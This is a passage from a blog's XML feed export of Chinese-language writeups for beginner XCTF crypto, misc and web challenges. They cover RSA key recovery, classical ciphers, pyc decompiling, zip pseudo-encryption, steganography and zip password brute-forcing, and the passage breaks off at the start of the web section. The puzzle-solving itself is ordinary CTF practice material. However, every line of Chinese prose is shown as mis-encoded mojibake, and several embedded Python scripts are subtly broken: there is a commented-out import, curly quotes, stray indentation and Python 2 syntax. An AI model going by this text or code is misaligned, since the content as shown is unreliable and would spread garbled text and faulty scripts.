å¯†==æ•°å­¦</p><blockquote><p>ä¸è¿‡åæ¥çœ‹å¾—æŸå¤§ä½¬ä¸€ç§æ›´ç‰›é€¼çš„åšæ³•ï¼Œåœ¨è¿™åˆ†äº«ä¸€ä¸‹ï¼š</p></blockquote><p>å°å·¥å…·åœ°å€ï¼š<a href="https://www.freebuf.com/articles/others-articles/161475.html">https://www.freebuf.com/articles/others-articles/161475.html</a><br>æ ¹æ®N=p*qè§£å‡ºNçš„å€¼ä¸º2135733555619387051<br>ç„¶åä½¿ç”¨è¿™ä¸ªå°å·¥å…·è¾“å…¥å‘½ä»¤</p><blockquote><p>python solve.py â€“verbose â€“private -N 2135733555619387051 -e 17 -p 473398607161 -q 4511491</p></blockquote><p>å°±å¾—åˆ°äº†dçš„å€¼<br>æ˜¯ä¸æ˜¯å¾ˆå¼º</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3914656980.png"></p><h2 id="ä¸ä»…ä»…æ˜¯Morse"><a href="#ä¸ä»…ä»…æ˜¯Morse" class="headerlink" title="ä¸ä»…ä»…æ˜¯Morse"></a>ä¸ä»…ä»…æ˜¯Morse</h2><p>çœ‹é¢˜ç›®ï¼Œä¸‹é™„ä»¶ï¼›æ‰“å¼€é™„ä»¶ï¼ŒæŒ‰é¢˜ç›®ç”¨æ‘©æ–¯å¯†ç è§£ä¸€ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2298439705.png"></p><p>æ ¹æ®è§£å¯†å¾—åˆ°çš„æƒ…æŠ¥ï¼Œå¯èƒ½è¿˜æœ‰ä»€ä¹ˆhhhï¼Œåé¢éƒ½æ˜¯ababçš„æ’åºï¼ŒçŒœæµ‹åº”è¯¥æ˜¯åŸ¹æ ¹åŠ å¯†ï¼Œäºæ˜¯å°±ç”¨åŸ¹æ ¹è§£å¯†ä¸€ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1697721415.png"></p><p>åŠ ä¸Šé¢˜ç›®ç»™çš„æç¤ºä¸ºå°å†™çš„ï¼Œå¾—åˆ°æœ€ç»ˆçš„flag</p><p>é™„ä¸ŠåŸ¹æ ¹è§£å¯†ï¼š<a href="https://tool.bugku.com/peigen/">https://tool.bugku.com/peigen/</a></p><h2 id="easychallenge"><a href="#easychallenge" class="headerlink" title="easychallenge"></a>easychallenge</h2><p>ä¸‹å¥½é™„ä»¶å‘ç°æ˜¯ä¸ªpycåç¼€çš„æ–‡ä»¶ï¼Œæ²¡å¬è¯´è¿‡ï¼Œä¸€è„¸æ‡µâ€¦<br>å…ˆç™¾åº¦çœ‹çœ‹pycåç¼€æ˜¯ä»€ä¹ˆä¸œä¸œ</p><blockquote><p>pycæ–‡ä»¶å°±æ˜¯pyç¨‹åºç¼–è¯‘åå¾—åˆ°çš„æ–‡ä»¶ï¼Œæ˜¯ä¸€ç§äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ˜¯ä¸€ç§byte codeï¼Œpyæ–‡ä»¶å˜æˆpycæ–‡ä»¶åï¼Œè¿è¡ŒåŠ è½½çš„é€Ÿåº¦ä¼šæœ‰æ‰€æé«˜ï¼Œç»è¿‡pythonè§£é‡Šå™¨æœ€ç»ˆä¼šç”Ÿæˆæœºå™¨ç è¿è¡Œã€‚æ‰€ä»¥pycæ–‡ä»¶æ˜¯å¯ä»¥è·¨å¹³å°éƒ¨ç½²çš„ï¼Œç±»ä¼¼Javaçš„.classæ–‡ä»¶ã€‚å¦‚æœpyæ–‡ä»¶æ”¹å˜ï¼Œä¹Ÿä¼šé‡æ–°ç”Ÿæˆpycæ–‡ä»¶ã€‚</p></blockquote><p>æ¥ç€åœ¨ç™¾åº¦æ—¶ï¼Œå¾—çŸ¥å¯ä»¥é€šè¿‡åœ¨çº¿å·¥å…·è¿›è¡Œåç¼–è¯‘ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/407271199.png"></p><p>é™„ä¸Šé“¾æ¥ï¼š<a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p><p>åœ¨çº¿åç¼–è¯‘pycåå¾—åˆ°æºä»£ç ï¼Œæ ¹æ®åŠ å¯†è§„åˆ™è§£å¯†å¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#import base64</span><br><span class="line">final &#x3D; &#39;UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E&#x3D;&#x3D;&#x3D;&#39;</span><br><span class="line">def decode3(ans):</span><br><span class="line">return base64.b32decode(ans)</span><br><span class="line">def decode2(ans):</span><br><span class="line">s&#x3D;&#39;&#39;</span><br><span class="line">for i in ans:</span><br><span class="line">x&#x3D;i^36</span><br><span class="line">x&#x3D;x-36</span><br><span class="line">s+&#x3D;chr(x)</span><br><span class="line">return s</span><br><span class="line">def decode1(ans):</span><br><span class="line">s&#x3D;&#39;&#39;</span><br><span class="line">for i in ans:</span><br><span class="line">x&#x3D;ord(i)-25</span><br><span class="line">x&#x3D;x^36</span><br><span class="line">s+&#x3D;chr(x)</span><br><span class="line">return s</span><br><span class="line">t1&#x3D;decode3(final)</span><br><span class="line">print(t1)</span><br><span class="line">t2&#x3D;decode2(t1)</span><br><span class="line">print(t2)</span><br><span class="line">print(decode1(t2))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2191619144.png"></p><p>åæ¥çœ‹äº†å¤§ä½¬ä»¬çš„wpå‘ç°è¿˜æœ‰ä¸€ä¸ªåç¼–è¯‘çš„å·¥å…·<br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/hippotomons/article/details/102538110">https://blog.csdn.net/hippotomons/article/details/102538110</a></p><h2 id="Normal-RSA"><a href="#Normal-RSA" class="headerlink" title="Normal_RSA"></a>Normal_RSA</h2><p>åˆæ˜¯RSAï¼Œç»è¿‡å‰é¢çš„ä¸€é“RSAåï¼Œè¿™æ¬¡å†ä½¿ç”¨å·¥å…·å°è¯•ä¸€ä¸‹åˆ°åº•ä¼šä¸ä¼š<br>æŒ‰æç¤ºè¾“å…¥å¯¹åº”çš„å‘½ä»¤ï¼š</p><blockquote><p>python solve.py â€“verbose -k examples/jarvis_oj_mediumRSA/pubkey.pem â€“decrypt examples/jarvis_oj_mediumRSA/flag.enc</p></blockquote><p>æœ€åæˆåŠŸæ‹¿åˆ°äº†flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3748581080.png"></p><p>å˜¿å˜¿ï¼Œè¿˜ä¸é”™</p><h2 id="è½¬è½®æœºåŠ å¯†"><a href="#è½¬è½®æœºåŠ å¯†" class="headerlink" title="è½¬è½®æœºåŠ å¯†"></a>è½¬è½®æœºåŠ å¯†</h2><p>å…ˆç™¾åº¦çœ‹çœ‹<a href="https://www.cnblogs.com/block2016/p/5419894.html"><strong>è½¬è½®æœºåŠ å¯†</strong></a></p><blockquote><p>å·¥ä½œåŸç†ï¼š<br>è½¬è½®å¯†ç æœºç”±å¤šä¸ªè½¬è½®æ„æˆï¼Œæ¯ä¸ªè½¬è½®æ—‹è½¬çš„é€Ÿåº¦éƒ½ä¸ä¸€æ ·ï¼Œæ¯”å¦‚æœ‰3ä¸ªè½¬è½®ï¼Œåˆ†åˆ«æ ‡å·ä¸º1,2,3ï¼Œå…¶ä¸­1å·è½¬è½®è½¬åŠ¨26ä¸ªå­—æ¯åï¼Œ2å·è½¬è½®å°±è½¬åŠ¨ä¸€ä¸ªå­—æ¯ï¼Œå½“2å·è½¬è½®è½¬åŠ¨26ä¸ªå­—æ¯åï¼Œ3å·è½¬è½®å°±è½¬åŠ¨1ä¸ªå­—æ¯ã€‚å› æ­¤ï¼Œå½“è½¬è½®å¯†ç æœºè½¬åŠ¨26X26X26æ¬¡åï¼Œæ‰€æœ‰è½¬è½®æ¢å¤åˆ°åˆå§‹çŠ¶æ€ï¼Œå³3ä¸ªè½¬è½®å¯†ç æœºçš„ä¸€ä¸ªå‘¨æœŸé•¿åº¦ä¸º26X26X26ï¼ˆ17576ï¼‰çš„å¤šè¡¨ä»£æ¢å¯†ç ã€‚</p></blockquote><p>æ¥ç€æ‰“å¼€æ–‡ä»¶ï¼ŒæŒ‰ä»–ç»™å‡ºçš„è¿›è¡Œæ’åºï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4263613619.png"></p><p>ä¸ºäº†çœ‹å¾—æ›´åŠ æ–¹ä¾¿ï¼Œé€ä¸ªå°†å…¶å†™å‡ºæ¥ï¼Œæœ€åè¯•å‡ºæ¥flag(æ³¨æ„æ˜¯å°å†™çš„)ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2458369657.png"></p><p>é™„ä¸Šå®˜æ–¹wpçš„ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#import re</span><br><span class="line">sss&#x3D;&#39;&#39;&#39;1: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt; 2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt; 3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt; 4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt; 5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt; 6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt; 7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt; 8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt; 9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt; 10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt; 11 &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt; 12 &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt; 13 &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">m&#x3D;&quot;NFQKSEVOQOFNP&quot;</span><br><span class="line">content&#x3D;re.findall(r&#39;&lt; (.*?) &lt;&#39;,sss,re.S)</span><br><span class="line">print content</span><br><span class="line">iv&#x3D;[2,3,7,5,13,12,9,1,8,10,4,11,6]</span><br><span class="line">vvv&#x3D;[]</span><br><span class="line">ans&#x3D;&quot;&quot;</span><br><span class="line">for i in range(13):</span><br><span class="line">index&#x3D;content[iv[i]-1].index(m[i])</span><br><span class="line">vvv.append(index)</span><br><span class="line">print vvv</span><br><span class="line">for i in range(0,26):</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for j in range(13):</span><br><span class="line">flag+&#x3D;content[iv[j]-1][(vvv[j]+i)%26]</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h2 id="easy-ECC"><a href="#easy-ECC" class="headerlink" title="easy_ECC"></a>easy_ECC</h2><p>ECCï¼Ÿ<a href="https://www.8btc.com/article/15089"><strong>ç™¾åº¦ä¸€ä¸‹</strong></a>çœ‹çœ‹<br>æ²¡å¤ªæ‡‚ï¼Œç™¾åº¦ä¸€æ³¢wpï¼Œå‘ç°æœ‰ä¸ªå«ECCTOOLçš„è½¯ä»¶å¯ä»¥ç®—å‡ºx+yçš„å€¼æ¥<br><a href="https://blog.csdn.net/qq_43550956/article/details/102592719"><strong>å…·ä½“æ“ä½œ</strong></a></p><blockquote><p>å¥½äº†ï¼Œcryptoæ–°æ‰‹åŒºwpä¹Ÿåˆ°æ­¤ç»“æŸäº†<br>è‹¥å“ªæœ‰é—®é¢˜ï¼Œæ¬¢è¿å¸ˆå‚…ä»¬åº•ä¸‹ç•™è¨€</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-Miscæ–°æ‰‹åŒº</title>
      <link href="2020/02/27/XCTF-Misc%E6%96%B0%E6%89%8B%E5%8C%BAwp/"/>
      <url>2020/02/27/XCTF-Misc%E6%96%B0%E6%89%8B%E5%8C%BAwp/</url>
      
        <content type="html"><![CDATA[<h2 id="this-is-flag"><a href="#this-is-flag" class="headerlink" title="this_is_flag"></a>this_is_flag</h2><p>Emmmmmï¼Œç­¾åˆ°é¢˜ï¼Œflagå°±åœ¨é¢˜ç›®ä¸­</p><h2 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h2><p>ä¸‹å¥½é™„ä»¶ï¼Œæ‰“å¼€å°±æ˜¯ä¸€å¼ å›¾ç‰‡<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1228143788.png"></p><p>é¢˜ç›®åº”è¯¥åœ¨æš—ç¤ºä»€ä¹ˆï¼Œäºæ˜¯æˆ‘ç”¨2345æ‰“å¼€ç¼–è¾‘ä¸€ä¸‹ï¼Œæ‹–åŠ¨ä¸€ä¸‹æœç„¶æœ‰ç‚¹ä¸œè¥¿</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/413273212.png"></p><h2 id="å¦‚æ¥åä¸‰æŒ"><a href="#å¦‚æ¥åä¸‰æŒ" class="headerlink" title="å¦‚æ¥åä¸‰æŒ"></a>å¦‚æ¥åä¸‰æŒ</h2><p>æ‰“å¼€é™„ä»¶ï¼Œä¸€å †ä½›è¯­</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3083201790.png"></p><p>è¿™ç¬¬ä¸€æ¬¡æ¥è§¦è‚¯å®šè£‚å¼€ï¼Œè¿™éœ€è¦ç”¨åˆ°ï¼šä¸ä½›è®ºç¦…<br>é™„ä¸Šé“¾æ¥ï¼š<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a><br>ï¼ˆæ³¨ï¼šä½¿ç”¨å‰è¦åŠ ä¸Šä½›æ›°ï¼šï¼‰<br>è§£å¯†å¾—åˆ°ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/825069527.png"></p><p>ä¸€çœ‹æ„Ÿè§‰åº”è¯¥æ˜¯base64ï¼Œç»“æœä¸å¯¹â€¦<br>åä¸‰ï¼Ÿè¯•ä¸€ä¸‹rot13ï¼Œæœç„¶å¦‚æ­¤ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/433591943.png"></p><p>æ¥ç€å†è¯•è¯•base64:ï¼ŒæˆåŠŸå¾—åˆ°flagï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/690561122.png"></p><h2 id="give-you-flag"><a href="#give-you-flag" class="headerlink" title="give_you_flag"></a>give_you_flag</h2><p>æ‰“å¼€é™„ä»¶ä¸€çœ‹æ˜¯ä¸ªgif<br>å…ˆçœ‹çœ‹å±æ€§å•¥çš„ï¼Œå‘ç°æ²¡å•¥ç‰¹åˆ«<br>æ¥ç€ç”¨2345æ‰“å¼€é€å¸§æŸ¥çœ‹ï¼Œå‘ç°æœ‰å‡ å¼ æ®‹ç¼ºçš„äºŒç»´ç ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/928412761.png"></p><p>è¿™æ—¶å°±éœ€è¦ç”¨åˆ°ä¸€ä¸ªè½¯ä»¶ï¼šStegsolve<br>é™„ä¸Šé“¾æ¥ï¼š<a href="https://pan.baidu.com/s/17hVkkIuZrunFF2fwDd7qKA">https://pan.baidu.com/s/17hVkkIuZrunFF2fwDd7qKA</a> ï¼ˆæå–ç ï¼ša5dsï¼‰<br>æœ€ç»ˆåˆå¹¶å‡ºä¸€ä¸ªå®Œæ•´çš„äºŒç»´ç ï¼š<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1953611089.png"></p><p>æ‰«ä¸€æ‰«äºŒç»´ç è·å–flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/763992316.png"></p><h2 id="åšæŒ60s"><a href="#åšæŒ60s" class="headerlink" title="åšæŒ60s"></a>åšæŒ60s</h2><p>æ‰“å¼€é™„ä»¶ï¼Œæ˜¯ä¸ªjarå°æ¸¸æˆï¼Œç‚¹å¼€ç©ç©çœ‹<br>å¥½å§ï¼Œç©ä¸èµ·â€¦â€¦</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/376056459.png"></p><p>è¿™é‡Œæˆ‘ä½¿ç”¨javaåç¼–è¯‘å·¥å…·ï¼Œæ‰“å¼€æŸ¥çœ‹æºç ï¼ŒæˆåŠŸè·å–flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/621982173.png"></p><p>emmmmï¼Œè¿™ä¸ªè½¯ä»¶å‡ºäº†ç‚¹é—®é¢˜ï¼Œæš‚æ—¶å°±ä¸æä¾›é“¾æ¥äº†ï¼Œå¯è‡ªè¡Œç™¾åº¦ä¸‹è½½</p><h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p>æ‰“å¼€é™„ä»¶ï¼Œé‡Œé¢å…¨æ˜¯é»‘ç™½å›¾ç‰‡ï¼Œéš¾é“è€ƒå¯ŸåŠ å¯†ï¼Ÿ<br>çœ‹å®Œå¤§ä½¬çš„wpæ‰çŸ¥é“æ˜¯è€ƒå¯ŸäºŒè¿›åˆ¶è½¬å­—ç¬¦ä¸²<br>å…ˆå°†å…¶å†™æˆäºŒè¿›åˆ¶ï¼š</p><blockquote><p>01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101</p></blockquote><p>æ¥ç€å¼€å§‹<ins><a href="http://www.txttool.com/wenben_binarystr.asp"><strong>åœ¨çº¿è½¬å­—ç¬¦ä¸²</strong></a></ins>ï¼Œè·å–flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1993429052.png"></p><h2 id="æ€æ¡Œå­"><a href="#æ€æ¡Œå­" class="headerlink" title="æ€æ¡Œå­"></a>æ€æ¡Œå­</h2><p>é€šè¿‡é¢˜ç›®ç»™çš„æŠ¥æ–‡ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯åå…­è¿›åˆ¶ï¼Œæ— æœ<br>ç™¾åº¦çœ‹äº†æ³¢wpæ‰çŸ¥é“äº†è¦ASCIIç å€¼å‡å»128å†è½¬å­—ç¬¦ä¸²<br>æ¥ç€å°±å¼€å§‹å†™è„šæœ¬ï¼Œæ‹¿flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/350174961.png"></p><p>é™„ä¸Šè„šæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">    a&#x3D;â€™01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101â€™</span><br><span class="line">    b&#x3D;re.findall(râ€™.&#123;8&#125;â€™,a)</span><br><span class="line">    flag&#x3D;â€™â€™</span><br><span class="line">    for i in b:</span><br><span class="line">        flag +&#x3D; chr(int(i,2))</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><h2 id="base64stego"><a href="#base64stego" class="headerlink" title="base64stego"></a>base64stego</h2><p>æ‰“å¼€é™„ä»¶ï¼Œæ˜¯ä¸ªåŠ å¯†äº†çš„åŒ…</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3092321336.png"></p><p>è¿˜æƒ³ç€ç›´æ¥çˆ†ç ´å‡ºæ¥ï¼Œæ— æœâ€¦</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3620590430.png"></p><p>çœ‹æ¥åº”è¯¥æ˜¯ä¸ªä¼ªåŠ å¯†ï¼Œæ¥ç€ç”¨winhexæ‰“å¼€çœ‹çœ‹ï¼Œæœç„¶éªŒè¯äº†æˆ‘çš„çŒœæµ‹ï¼Œç„¶åå°†09â€”&gt;00</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3826792588.png"></p><p>æ¥ç€å°±å¯ä»¥è§£å‹ï¼Œå¾—åˆ°æ–‡æ¡£</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/218435078.png"></p><p>å…ˆbase64è§£ç ä¸€ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1624238187.png"></p><p>ç¿»è¯‘ä¸€ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/80934721.png"></p><p>æ ¹æ®æç¤ºå¾—çŸ¥è¿™æ˜¯<a href="https://www.cnblogs.com/Elope/p/6725824.html"><strong>base64éšå†™</strong></a>ï¼Œæ¥çœ‹çœ‹<a href="https://www.tr0y.wang/2017/06/14/Base64steg/"><strong>å¤§ä½¬çš„ç¬”è®°</strong></a><br>æ¥ç€æˆ‘å°±ä¸ä¼šäº†ï¼Œä¸è¿‡å¯ä»¥çœ‹çœ‹<a href="https://blog.csdn.net/m0_37442062/article/details/90517209"><strong>è¿™ä½å¤§ä½¬çš„wp</strong></a></p><p>é™„ä¸Šä¼ªåŠ å¯†çŸ¥è¯†ç‚¹é“¾æ¥ï¼š<a href="https://blog.csdn.net/weixin_41687289/article/details/82695801">https://blog.csdn.net/weixin_41687289/article/details/82695801</a></p><h2 id="ext3"><a href="#ext3" class="headerlink" title="ext3"></a>ext3</h2><p>é™„ä»¶ä¸çŸ¥é“æ˜¯å•¥ä¸œè¥¿ï¼Œæ‰“å¼€kaliå…ˆçœ‹çœ‹ï¼Œå‘ç°é‡Œé¢æœ‰flag.txtï¼Œæ¥ç€å°±å¼€å§‹binwalkåˆ†ç¦»ä¸€ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1624912640.png"></p><p>æœ€ç»ˆå¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2823562298.png"></p><h2 id="stegano"><a href="#stegano" class="headerlink" title="stegano"></a>stegano</h2><p>è¿™é‡Œæˆ‘æ˜¯ç”¨ç«ç‹æµè§ˆå™¨æ‰“å¼€ï¼Œç„¶ååœ¨æ§åˆ¶å°è¾“å…¥å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.documentElement.textContent</span><br></pre></td></tr></table></figure><p>æ¥ç€å°±ä¼šå‡ºç°å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1441031241.png"></p><blockquote><p>BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB</p></blockquote><p>çœ‹åˆ°ababçš„æ’åºå°±æƒ³åˆ°äº†åŸ¹æ ¹åŠ å¯†ï¼Œæ— æœâ€¦<br>ç„¶åè¯•äº†è¯•æ”¹æˆæ‘©æ–¯å¯†ç ï¼ŒæŠŠAæ¢æˆ.ï¼ŒæŠŠBæ¢æˆ-<br>æœ€åè§£å‡ºflag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2781309532.png"></p><h2 id="åŠŸå¤«å†é«˜ä¹Ÿæ€•èœåˆ€"><a href="#åŠŸå¤«å†é«˜ä¹Ÿæ€•èœåˆ€" class="headerlink" title="åŠŸå¤«å†é«˜ä¹Ÿæ€•èœåˆ€"></a>åŠŸå¤«å†é«˜ä¹Ÿæ€•èœåˆ€</h2><p>ä¸‹å¥½é™„ä»¶ï¼Œæ‰“å¼€è™šæ‹Ÿæœºï¼Œå…ˆbinwalkçœ‹çœ‹</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2650433505.png"></p><p>æˆåŠŸåˆ†ç¦»ï¼Œæ‰¾åˆ°flagçš„æ–‡æœ¬ï¼Œä½†æ˜¯åŠ å¯†äº†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1261478689.png"></p><p>æ¥ç€å°±ç›´æ¥ä¸Šå·¥å…·çˆ†ç ´ï¼Œå¯†ç æ¯”è¾ƒå¤æ‚ï¼Œæ‰€ä»¥æœ‰ç‚¹ä¹…â€¦</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4199382113.png"></p><p>æœ€åå¾—åˆ°å¯†ç ï¼Œè·å¾—flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2255221359.png"></p><h2 id="SimpleRAR"><a href="#SimpleRAR" class="headerlink" title="SimpleRAR"></a>SimpleRAR</h2><p>æ‰“å¼€é™„ä»¶ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3873287732.png"></p><p>é€šè¿‡winhexå‘ç°é‡Œé¢è¿˜æœ‰å¼ å›¾ç‰‡ï¼Œä½†æ˜¯åŒ…æ˜¯æŸåäº†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2778888132.png"></p><p>è¿™é‡Œæ¶‰åŠrarï¼Œé€šè¿‡ç™¾åº¦å¾—çŸ¥æ–‡ä»¶å—å¼€å¤´ï¼Œäºæ˜¯å°†7A-&gt;74ï¼Œç„¶åå°±è§£å‹æ­£å¸¸äº†<br>æ‰“å¼€åå‘ç°æ˜¯ä¸€å¼ ç©ºç™½çš„å›¾ç‰‡ï¼Œäºæ˜¯ç»§ç»­ç”¨winhexæ‰“å¼€ï¼Œå¾—çŸ¥å®ƒæ˜¯ä¸ªgif</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1915711535.png"></p><p>æ¥ç€æˆ‘ç”¨Stegsolveæ‰“å¼€å›¾ç‰‡ï¼Œå‘ç°æ˜¯ä¸ªåŠä¸ªäºŒç»´ç â€¦<br>è¿™é‡ŒçŒœæµ‹åº”è¯¥æ˜¯é‡å äº†ï¼Œç„¶åå°±è¯¥æ¬å‡ºPSè€å­¦å§äº†ï¼Œè¿›è¡Œä¸€æ³¢PSå·¥ç¨‹å¾—åˆ°ä¸€ä¸ªå®Œæ•´çš„äºŒç»´ç å¹¶æ‰«ç å¾—å‡ºflag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/32122431.png"></p><blockquote><p>ç»ˆäºç»“ç¯‡äº†ï¼Œæˆ‘å¤ªéš¾äº†<br>è‹¥å“ªæœ‰é—®é¢˜ï¼Œæ¬¢è¿å¸ˆå‚…ä»¬åº•ä¸‹ç•™è¨€</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-Webæ–°æ‰‹åŒº</title>
      <link href="2020/02/25/XCTF-Web%E6%96%B0%E6%89%8B%E5%8C%BAwp/"/>
      <url>2020/02/25/XCTF-Web%E6%96%B0%E6%89%8B%E5%8C%BAwp/</url>
      
        <content type="html"><![CDATA[<h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><p>è¿™é¢˜ç®—æ˜¯ç­¾åˆ°é¢˜ï¼Œåå…«ç½—æ±‰ç¬¬ä¸€å¼ï¼šæŸ¥çœ‹æºä»£ç <br>è·å–åœºæ™¯ï¼Œæ‰“å¼€å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2289870338.png"></p><p>æ­¤æ—¶å‘ç°å³å‡»ä¸äº†ï¼Œäºæ˜¯å°±åŠ ä¸Šâ€œview_source:â€å°±å¯ä»¥æŸ¥çœ‹æºç ï¼Œç›´æ¥å°±å‡ºæ¥flagäº†ï¼Œæ‰€ä»¥è¯´æ˜¯ç­¾åˆ°é¢˜</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1650584050.png"></p><h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p>ä¸€çœ‹é¢˜ç›®robotsï¼Œåå…«ç½—æ±‰ç›´æ¥ä¸Š<br>å…ˆè·å–åœºæ™¯ï¼Œç„¶åç›´æ¥åŠ 